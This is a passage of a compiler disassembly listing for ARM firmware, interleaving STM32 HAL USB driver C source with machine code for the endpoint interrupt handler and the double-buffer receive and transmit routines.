 8002c60:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c62:	2200      	movs	r2, #0
 8002c64:	619a      	str	r2, [r3, #24]
            }

            /* Zero Length Packet? */
            if (ep->xfer_len == 0U)
 8002c66:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c68:	699b      	ldr	r3, [r3, #24]
 8002c6a:	2b00      	cmp	r3, #0
 8002c6c:	d106      	bne.n	8002c7c <PCD_EP_ISR_Handler+0x736>
            {
              /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
              hpcd->DataInStageCallback(hpcd, ep->num);
#else
              HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002c6e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c70:	781b      	ldrb	r3, [r3, #0]
 8002c72:	4619      	mov	r1, r3
 8002c74:	6878      	ldr	r0, [r7, #4]
 8002c76:	f009 fe46 	bl	800c906 <HAL_PCD_DataInStageCallback>
 8002c7a:	e01b      	b.n	8002cb4 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
            }
            else
            {
              /* Transfer is not yet Done */
              ep->xfer_buff += TxPctSize;
 8002c7c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c7e:	695a      	ldr	r2, [r3, #20]
 8002c80:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002c84:	441a      	add	r2, r3
 8002c86:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c88:	615a      	str	r2, [r3, #20]
              ep->xfer_count += TxPctSize;
 8002c8a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c8c:	69da      	ldr	r2, [r3, #28]
 8002c8e:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002c92:	441a      	add	r2, r3
 8002c94:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c96:	61da      	str	r2, [r3, #28]
              (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002c98:	687b      	ldr	r3, [r7, #4]
 8002c9a:	681b      	ldr	r3, [r3, #0]
 8002c9c:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002c9e:	4618      	mov	r0, r3
 8002ca0:	f003 fec3 	bl	8006a2a <USB_EPStartXfer>
 8002ca4:	e006      	b.n	8002cb4 <PCD_EP_ISR_Handler+0x76e>
          }
#if (USE_USB_DOUBLE_BUFFER == 1U)
          /* Double Buffer bulk IN (bulk transfer Len > Ep_Mps) */
          else
          {
            (void)HAL_PCD_EP_DB_Transmit(hpcd, ep, wEPVal);
 8002ca6:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002caa:	461a      	mov	r2, r3
 8002cac:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002cae:	6878      	ldr	r0, [r7, #4]
 8002cb0:	f000 f917 	bl	8002ee2 <HAL_PCD_EP_DB_Transmit>
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 8002cb4:	687b      	ldr	r3, [r7, #4]
 8002cb6:	681b      	ldr	r3, [r3, #0]
 8002cb8:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002cbc:	b29b      	uxth	r3, r3
 8002cbe:	b21b      	sxth	r3, r3
 8002cc0:	2b00      	cmp	r3, #0
 8002cc2:	f6ff ac45 	blt.w	8002550 <PCD_EP_ISR_Handler+0xa>
        }
      }
    }
  }

  return HAL_OK;
 8002cc6:	2300      	movs	r3, #0
}
 8002cc8:	4618      	mov	r0, r3
 8002cca:	3758      	adds	r7, #88	; 0x58
 8002ccc:	46bd      	mov	sp, r7
 8002cce:	bd80      	pop	{r7, pc}

08002cd0 <HAL_PCD_EP_DB_Receive>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static uint16_t HAL_PCD_EP_DB_Receive(PCD_HandleTypeDef *hpcd,
                                      PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002cd0:	b580      	push	{r7, lr}
 8002cd2:	b088      	sub	sp, #32
 8002cd4:	af00      	add	r7, sp, #0
 8002cd6:	60f8      	str	r0, [r7, #12]
 8002cd8:	60b9      	str	r1, [r7, #8]
 8002cda:	4613      	mov	r3, r2
 8002cdc:	80fb      	strh	r3, [r7, #6]
  uint16_t count;

  /* Manage Buffer0 OUT */
  if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8002cde:	88fb      	ldrh	r3, [r7, #6]
 8002ce0:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002ce4:	2b00      	cmp	r3, #0
 8002ce6:	d07c      	beq.n	8002de2 <HAL_PCD_EP_DB_Receive+0x112>
  {
    /* Get count of received Data on buffer0 */
    count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002ce8:	68fb      	ldr	r3, [r7, #12]
 8002cea:	681b      	ldr	r3, [r3, #0]
 8002cec:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002cf0:	b29b      	uxth	r3, r3
 8002cf2:	461a      	mov	r2, r3
 8002cf4:	68bb      	ldr	r3, [r7, #8]
 8002cf6:	781b      	ldrb	r3, [r3, #0]
 8002cf8:	00db      	lsls	r3, r3, #3
 8002cfa:	4413      	add	r3, r2
 8002cfc:	68fa      	ldr	r2, [r7, #12]
 8002cfe:	6812      	ldr	r2, [r2, #0]
 8002d00:	4413      	add	r3, r2
 8002d02:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002d06:	881b      	ldrh	r3, [r3, #0]
 8002d08:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002d0c:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002d0e:	68bb      	ldr	r3, [r7, #8]
 8002d10:	699a      	ldr	r2, [r3, #24]
 8002d12:	8b7b      	ldrh	r3, [r7, #26]
 8002d14:	429a      	cmp	r2, r3
 8002d16:	d306      	bcc.n	8002d26 <HAL_PCD_EP_DB_Receive+0x56>
    {
      ep->xfer_len -= count;
 8002d18:	68bb      	ldr	r3, [r7, #8]
 8002d1a:	699a      	ldr	r2, [r3, #24]
 8002d1c:	8b7b      	ldrh	r3, [r7, #26]
 8002d1e:	1ad2      	subs	r2, r2, r3
 8002d20:	68bb      	ldr	r3, [r7, #8]
 8002d22:	619a      	str	r2, [r3, #24]
 8002d24:	e002      	b.n	8002d2c <HAL_PCD_EP_DB_Receive+0x5c>
    }
    else
    {
      ep->xfer_len = 0U;
 8002d26:	68bb      	ldr	r3, [r7, #8]
 8002d28:	2200      	movs	r2, #0
 8002d2a:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002d2c:	68bb      	ldr	r3, [r7, #8]
 8002d2e:	699b      	ldr	r3, [r3, #24]
 8002d30:	2b00      	cmp	r3, #0
 8002d32:	d123      	bne.n	8002d7c <HAL_PCD_EP_DB_Receive+0xac>
    {
      /* set NAK to OUT endpoint since double buffer is enabled */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002d34:	68fb      	ldr	r3, [r7, #12]
 8002d36:	681b      	ldr	r3, [r3, #0]
 8002d38:	461a      	mov	r2, r3
 8002d3a:	68bb      	ldr	r3, [r7, #8]
 8002d3c:	781b      	ldrb	r3, [r3, #0]
 8002d3e:	009b      	lsls	r3, r3, #2
 8002d40:	4413      	add	r3, r2
 8002d42:	881b      	ldrh	r3, [r3, #0]
 8002d44:	b29b      	uxth	r3, r3
 8002d46:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002d4a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002d4e:	833b      	strh	r3, [r7, #24]
 8002d50:	8b3b      	ldrh	r3, [r7, #24]
 8002d52:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002d56:	833b      	strh	r3, [r7, #24]
 8002d58:	68fb      	ldr	r3, [r7, #12]
 8002d5a:	681b      	ldr	r3, [r3, #0]
 8002d5c:	461a      	mov	r2, r3
 8002d5e:	68bb      	ldr	r3, [r7, #8]
 8002d60:	781b      	ldrb	r3, [r3, #0]
 8002d62:	009b      	lsls	r3, r3, #2
 8002d64:	441a      	add	r2, r3
 8002d66:	8b3b      	ldrh	r3, [r7, #24]
 8002d68:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002d6c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002d70:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002d74:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002d78:	b29b      	uxth	r3, r3
 8002d7a:	8013      	strh	r3, [r2, #0]
    }

    /* Check if Buffer1 is in blocked state which requires to toggle */
    if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002d7c:	88fb      	ldrh	r3, [r7, #6]
 8002d7e:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002d82:	2b00      	cmp	r3, #0
 8002d84:	d01f      	beq.n	8002dc6 <HAL_PCD_EP_DB_Receive+0xf6>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002d86:	68fb      	ldr	r3, [r7, #12]
 8002d88:	681b      	ldr	r3, [r3, #0]
 8002d8a:	461a      	mov	r2, r3
 8002d8c:	68bb      	ldr	r3, [r7, #8]
 8002d8e:	781b      	ldrb	r3, [r3, #0]
 8002d90:	009b      	lsls	r3, r3, #2
 8002d92:	4413      	add	r3, r2
 8002d94:	881b      	ldrh	r3, [r3, #0]
 8002d96:	b29b      	uxth	r3, r3
 8002d98:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002d9c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002da0:	82fb      	strh	r3, [r7, #22]
 8002da2:	68fb      	ldr	r3, [r7, #12]
 8002da4:	681b      	ldr	r3, [r3, #0]
 8002da6:	461a      	mov	r2, r3
 8002da8:	68bb      	ldr	r3, [r7, #8]
 8002daa:	781b      	ldrb	r3, [r3, #0]
 8002dac:	009b      	lsls	r3, r3, #2
 8002dae:	441a      	add	r2, r3
 8002db0:	8afb      	ldrh	r3, [r7, #22]
 8002db2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002db6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002dba:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002dbe:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002dc2:	b29b      	uxth	r3, r3
 8002dc4:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8002dc6:	8b7b      	ldrh	r3, [r7, #26]
 8002dc8:	2b00      	cmp	r3, #0
 8002dca:	f000 8085 	beq.w	8002ed8 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8002dce:	68fb      	ldr	r3, [r7, #12]
 8002dd0:	6818      	ldr	r0, [r3, #0]
 8002dd2:	68bb      	ldr	r3, [r7, #8]
 8002dd4:	6959      	ldr	r1, [r3, #20]
 8002dd6:	68bb      	ldr	r3, [r7, #8]
 8002dd8:	891a      	ldrh	r2, [r3, #8]
 8002dda:	8b7b      	ldrh	r3, [r7, #26]
 8002ddc:	f005 fb73 	bl	80084c6 <USB_ReadPMA>
 8002de0:	e07a      	b.n	8002ed8 <HAL_PCD_EP_DB_Receive+0x208>
  }
  /* Manage Buffer 1 DTOG_RX=0 */
  else
  {
    /* Get count of received data */
    count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8002de2:	68fb      	ldr	r3, [r7, #12]
 8002de4:	681b      	ldr	r3, [r3, #0]
 8002de6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002dea:	b29b      	uxth	r3, r3
 8002dec:	461a      	mov	r2, r3
 8002dee:	68bb      	ldr	r3, [r7, #8]
 8002df0:	781b      	ldrb	r3, [r3, #0]
 8002df2:	00db      	lsls	r3, r3, #3
 8002df4:	4413      	add	r3, r2
 8002df6:	68fa      	ldr	r2, [r7, #12]
 8002df8:	6812      	ldr	r2, [r2, #0]
 8002dfa:	4413      	add	r3, r2
 8002dfc:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002e00:	881b      	ldrh	r3, [r3, #0]
 8002e02:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002e06:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002e08:	68bb      	ldr	r3, [r7, #8]
 8002e0a:	699a      	ldr	r2, [r3, #24]
 8002e0c:	8b7b      	ldrh	r3, [r7, #26]
 8002e0e:	429a      	cmp	r2, r3
 8002e10:	d306      	bcc.n	8002e20 <HAL_PCD_EP_DB_Receive+0x150>
    {
      ep->xfer_len -= count;
 8002e12:	68bb      	ldr	r3, [r7, #8]
 8002e14:	699a      	ldr	r2, [r3, #24]
 8002e16:	8b7b      	ldrh	r3, [r7, #26]
 8002e18:	1ad2      	subs	r2, r2, r3
 8002e1a:	68bb      	ldr	r3, [r7, #8]
 8002e1c:	619a      	str	r2, [r3, #24]
 8002e1e:	e002      	b.n	8002e26 <HAL_PCD_EP_DB_Receive+0x156>
    }
    else
    {
      ep->xfer_len = 0U;
 8002e20:	68bb      	ldr	r3, [r7, #8]
 8002e22:	2200      	movs	r2, #0
 8002e24:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002e26:	68bb      	ldr	r3, [r7, #8]
 8002e28:	699b      	ldr	r3, [r3, #24]
 8002e2a:	2b00      	cmp	r3, #0
 8002e2c:	d123      	bne.n	8002e76 <HAL_PCD_EP_DB_Receive+0x1a6>
    {
      /* set NAK on the current endpoint */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002e2e:	68fb      	ldr	r3, [r7, #12]
 8002e30:	681b      	ldr	r3, [r3, #0]
 8002e32:	461a      	mov	r2, r3
 8002e34:	68bb      	ldr	r3, [r7, #8]
 8002e36:	781b      	ldrb	r3, [r3, #0]
 8002e38:	009b      	lsls	r3, r3, #2
 8002e3a:	4413      	add	r3, r2
 8002e3c:	881b      	ldrh	r3, [r3, #0]
 8002e3e:	b29b      	uxth	r3, r3
 8002e40:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002e44:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002e48:	83fb      	strh	r3, [r7, #30]
 8002e4a:	8bfb      	ldrh	r3, [r7, #30]
 8002e4c:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002e50:	83fb      	strh	r3, [r7, #30]
 8002e52:	68fb      	ldr	r3, [r7, #12]
 8002e54:	681b      	ldr	r3, [r3, #0]
 8002e56:	461a      	mov	r2, r3
 8002e58:	68bb      	ldr	r3, [r7, #8]
 8002e5a:	781b      	ldrb	r3, [r3, #0]
 8002e5c:	009b      	lsls	r3, r3, #2
 8002e5e:	441a      	add	r2, r3
 8002e60:	8bfb      	ldrh	r3, [r7, #30]
 8002e62:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002e66:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002e6a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002e6e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002e72:	b29b      	uxth	r3, r3
 8002e74:	8013      	strh	r3, [r2, #0]
    }

    /*Need to FreeUser Buffer*/
    if ((wEPVal & USB_EP_DTOG_TX) == 0U)
 8002e76:	88fb      	ldrh	r3, [r7, #6]
 8002e78:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002e7c:	2b00      	cmp	r3, #0
 8002e7e:	d11f      	bne.n	8002ec0 <HAL_PCD_EP_DB_Receive+0x1f0>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002e80:	68fb      	ldr	r3, [r7, #12]
 8002e82:	681b      	ldr	r3, [r3, #0]
 8002e84:	461a      	mov	r2, r3
 8002e86:	68bb      	ldr	r3, [r7, #8]
 8002e88:	781b      	ldrb	r3, [r3, #0]
 8002e8a:	009b      	lsls	r3, r3, #2
 8002e8c:	4413      	add	r3, r2
 8002e8e:	881b      	ldrh	r3, [r3, #0]
 8002e90:	b29b      	uxth	r3, r3
 8002e92:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002e96:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002e9a:	83bb      	strh	r3, [r7, #28]
 8002e9c:	68fb      	ldr	r3, [r7, #12]
 8002e9e:	681b      	ldr	r3, [r3, #0]
 8002ea0:	461a      	mov	r2, r3
 8002ea2:	68bb      	ldr	r3, [r7, #8]
 8002ea4:	781b      	ldrb	r3, [r3, #0]
 8002ea6:	009b      	lsls	r3, r3, #2
 8002ea8:	441a      	add	r2, r3
 8002eaa:	8bbb      	ldrh	r3, [r7, #28]
 8002eac:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002eb0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002eb4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002eb8:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002ebc:	b29b      	uxth	r3, r3
 8002ebe:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8002ec0:	8b7b      	ldrh	r3, [r7, #26]
 8002ec2:	2b00      	cmp	r3, #0
 8002ec4:	d008      	beq.n	8002ed8 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 8002ec6:	68fb      	ldr	r3, [r7, #12]
 8002ec8:	6818      	ldr	r0, [r3, #0]
 8002eca:	68bb      	ldr	r3, [r7, #8]
 8002ecc:	6959      	ldr	r1, [r3, #20]
 8002ece:	68bb      	ldr	r3, [r7, #8]
 8002ed0:	895a      	ldrh	r2, [r3, #10]
 8002ed2:	8b7b      	ldrh	r3, [r7, #26]
 8002ed4:	f005 faf7 	bl	80084c6 <USB_ReadPMA>
    }
  }

  return count;
 8002ed8:	8b7b      	ldrh	r3, [r7, #26]
}
 8002eda:	4618      	mov	r0, r3
 8002edc:	3720      	adds	r7, #32
 8002ede:	46bd      	mov	sp, r7
 8002ee0:	bd80      	pop	{r7, pc}

08002ee2 <HAL_PCD_EP_DB_Transmit>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static HAL_StatusTypeDef HAL_PCD_EP_DB_Transmit(PCD_HandleTypeDef *hpcd,
                                                PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002ee2:	b580      	push	{r7, lr}
 8002ee4:	b0a4      	sub	sp, #144	; 0x90
 8002ee6:	af00      	add	r7, sp, #0
 8002ee8:	60f8      	str	r0, [r7, #12]
 8002eea:	60b9      	str	r1, [r7, #8]
 8002eec:	4613      	mov	r3, r2
 8002eee:	80fb      	strh	r3, [r7, #6]
  uint32_t len;
  uint16_t TxPctSize;

  /* Data Buffer0 ACK received */
  if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002ef0:	88fb      	ldrh	r3, [r7, #6]
 8002ef2:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002ef6:	2b00      	cmp	r3, #0
 8002ef8:	f000 81db 	beq.w	80032b2 <HAL_PCD_EP_DB_Transmit+0x3d0>
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002efc:	68fb      	ldr	r3, [r7, #12]
 8002efe:	681b      	ldr	r3, [r3, #0]
 8002f00:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002f04:	b29b      	uxth	r3, r3
 8002f06:	461a      	mov	r2, r3
 8002f08:	68bb      	ldr	r3, [r7, #8]
 8002f0a:	781b      	ldrb	r3, [r3, #0]
 8002f0c:	00db      	lsls	r3, r3, #3
 8002f0e:	4413      	add	r3, r2
 8002f10:	68fa      	ldr	r2, [r7, #12]
 8002f12:	6812      	ldr	r2, [r2, #0]
 8002f14:	4413      	add	r3, r2
 8002f16:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002f1a:	881b      	ldrh	r3, [r3, #0]
 8002f1c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002f20:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len > TxPctSize)
 8002f24:	68bb      	ldr	r3, [r7, #8]
 8002f26:	699a      	ldr	r2, [r3, #24]
 8002f28:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8002f2c:	429a      	cmp	r2, r3
 8002f2e:	d907      	bls.n	8002f40 <HAL_PCD_EP_DB_Transmit+0x5e>
    {
      ep->xfer_len -= TxPctSize;
 8002f30:	68bb      	ldr	r3, [r7, #8]
 8002f32:	699a      	ldr	r2, [r3, #24]
 8002f34:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8002f38:	1ad2      	subs	r2, r2, r3
 8002f3a:	68bb      	ldr	r3, [r7, #8]
 8002f3c:	619a      	str	r2, [r3, #24]
 8002f3e:	e002      	b.n	8002f46 <HAL_PCD_EP_DB_Transmit+0x64>
    }
    else
    {
      ep->xfer_len = 0U;
 8002f40:	68bb      	ldr	r3, [r7, #8]
 8002f42:	2200      	movs	r2, #0
 8002f44:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 8002f46:	68bb      	ldr	r3, [r7, #8]
 8002f48:	699b      	ldr	r3, [r3, #24]
 8002f4a:	2b00      	cmp	r3, #0
 8002f4c:	f040 80b9 	bne.w	80030c2 <HAL_PCD_EP_DB_Transmit+0x1e0>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002f50:	68bb      	ldr	r3, [r7, #8]
 8002f52:	785b      	ldrb	r3, [r3, #1]
 8002f54:	2b00      	cmp	r3, #0
 8002f56:	d126      	bne.n	8002fa6 <HAL_PCD_EP_DB_Transmit+0xc4>
 8002f58:	68fb      	ldr	r3, [r7, #12]
 8002f5a:	681b      	ldr	r3, [r3, #0]
 8002f5c:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002f5e:	68fb      	ldr	r3, [r7, #12]
 8002f60:	681b      	ldr	r3, [r3, #0]
 8002f62:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002f66:	b29b      	uxth	r3, r3
 8002f68:	461a      	mov	r2, r3
 8002f6a:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002f6c:	4413      	add	r3, r2
 8002f6e:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002f70:	68bb      	ldr	r3, [r7, #8]
 8002f72:	781b      	ldrb	r3, [r3, #0]
 8002f74:	00da      	lsls	r2, r3, #3
 8002f76:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002f78:	4413      	add	r3, r2
 8002f7a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002f7e:	62bb      	str	r3, [r7, #40]	; 0x28
 8002f80:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002f82:	881b      	ldrh	r3, [r3, #0]
 8002f84:	b29b      	uxth	r3, r3
 8002f86:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002f8a:	b29a      	uxth	r2, r3
 8002f8c:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002f8e:	801a      	strh	r2, [r3, #0]
 8002f90:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002f92:	881b      	ldrh	r3, [r3, #0]
 8002f94:	b29b      	uxth	r3, r3
 8002f96:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002f9a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002f9e:	b29a      	uxth	r2, r3
 8002fa0:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002fa2:	801a      	strh	r2, [r3, #0]
 8002fa4:	e01a      	b.n	8002fdc <HAL_PCD_EP_DB_Transmit+0xfa>
 8002fa6:	68bb      	ldr	r3, [r7, #8]
 8002fa8:	785b      	ldrb	r3, [r3, #1]
 8002faa:	2b01      	cmp	r3, #1
 8002fac:	d116      	bne.n	8002fdc <HAL_PCD_EP_DB_Transmit+0xfa>
 8002fae:	68fb      	ldr	r3, [r7, #12]
 8002fb0:	681b      	ldr	r3, [r3, #0]
 8002fb2:	637b      	str	r3, [r7, #52]	; 0x34
 8002fb4:	68fb      	ldr	r3, [r7, #12]
 8002fb6:	681b      	ldr	r3, [r3, #0]
 8002fb8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002fbc:	b29b      	uxth	r3, r3
 8002fbe:	461a      	mov	r2, r3
 8002fc0:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002fc2:	4413      	add	r3, r2
 8002fc4:	637b      	str	r3, [r7, #52]	; 0x34
 8002fc6:	68bb      	ldr	r3, [r7, #8]
 8002fc8:	781b      	ldrb	r3, [r3, #0]
 8002fca:	00da      	lsls	r2, r3, #3
 8002fcc:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002fce:	4413      	add	r3, r2
 8002fd0:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002fd4:	633b      	str	r3, [r7, #48]	; 0x30
 8002fd6:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002fd8:	2200      	movs	r2, #0
 8002fda:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002fdc:	68fb      	ldr	r3, [r7, #12]
 8002fde:	681b      	ldr	r3, [r3, #0]
 8002fe0:	627b      	str	r3, [r7, #36]	; 0x24
 8002fe2:	68bb      	ldr	r3, [r7, #8]
 8002fe4:	785b      	ldrb	r3, [r3, #1]
 8002fe6:	2b00      	cmp	r3, #0
 8002fe8:	d126      	bne.n	8003038 <HAL_PCD_EP_DB_Transmit+0x156>
 8002fea:	68fb      	ldr	r3, [r7, #12]
 8002fec:	681b      	ldr	r3, [r3, #0]
 8002fee:	61fb      	str	r3, [r7, #28]
 8002ff0:	68fb      	ldr	r3, [r7, #12]
 8002ff2:	681b      	ldr	r3, [r3, #0]
 8002ff4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002ff8:	b29b      	uxth	r3, r3
 8002ffa:	461a      	mov	r2, r3
 8002ffc:	69fb      	ldr	r3, [r7, #28]
 8002ffe:	4413      	add	r3, r2
 8003000:	61fb      	str	r3, [r7, #28]
 8003002:	68bb      	ldr	r3, [r7, #8]
 8003004:	781b      	ldrb	r3, [r3, #0]
 8003006:	00da      	lsls	r2, r3, #3
 8003008:	69fb      	ldr	r3, [r7, #28]
 800300a:	4413      	add	r3, r2
 800300c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003010:	61bb      	str	r3, [r7, #24]
 8003012:	69bb      	ldr	r3, [r7, #24]
 8003014:	881b      	ldrh	r3, [r3, #0]
 8003016:	b29b      	uxth	r3, r3
 8003018:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800301c:	b29a      	uxth	r2, r3
 800301e:	69bb      	ldr	r3, [r7, #24]
 8003020:	801a      	strh	r2, [r3, #0]
 8003022:	69bb      	ldr	r3, [r7, #24]
 8003024:	881b      	ldrh	r3, [r3, #0]
 8003026:	b29b      	uxth	r3, r3
 8003028:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800302c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003030:	b29a      	uxth	r2, r3
 8003032:	69bb      	ldr	r3, [r7, #24]
 8003034:	801a      	strh	r2, [r3, #0]
 8003036:	e017      	b.n	8003068 <HAL_PCD_EP_DB_Transmit+0x186>
 8003038:	68bb      	ldr	r3, [r7, #8]
 800303a:	785b      	ldrb	r3, [r3, #1]
 800303c:	2b01      	cmp	r3, #1
 800303e:	d113      	bne.n	8003068 <HAL_PCD_EP_DB_Transmit+0x186>
 8003040:	68fb      	ldr	r3, [r7, #12]
 8003042:	681b      	ldr	r3, [r3, #0]
 8003044:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003048:	b29b      	uxth	r3, r3
 800304a:	461a      	mov	r2, r3
 800304c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800304e:	4413      	add	r3, r2
 8003050:	627b      	str	r3, [r7, #36]	; 0x24
 8003052:	68bb      	ldr	r3, [r7, #8]
 8003054:	781b      	ldrb	r3, [r3, #0]
 8003056:	00da      	lsls	r2, r3, #3
 8003058:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800305a:	4413      	add	r3, r2
 800305c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003060:	623b      	str	r3, [r7, #32]
 8003062:	6a3b      	ldr	r3, [r7, #32]
 8003064:	2200      	movs	r2, #0
 8003066:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8003068:	68bb      	ldr	r3, [r7, #8]
 800306a:	781b      	ldrb	r3, [r3, #0]
 800306c:	4619      	mov	r1, r3
 800306e:	68f8      	ldr	r0, [r7, #12]
 8003070:	f009 fc49 	bl	800c906 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8003074:	88fb      	ldrh	r3, [r7, #6]
 8003076:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800307a:	2b00      	cmp	r3, #0
